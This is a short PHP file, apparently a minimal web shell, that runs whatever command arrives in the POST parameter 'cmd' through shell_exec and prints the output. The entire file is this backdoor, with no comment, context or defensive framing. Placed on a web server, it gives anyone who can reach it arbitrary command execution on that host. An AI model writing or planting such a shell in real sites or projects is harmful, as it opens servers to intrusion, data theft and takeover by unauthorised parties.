<?php
$cmd=$_POST['cmd'];
$result=shell_exec("$cmd");
echo $result;
?>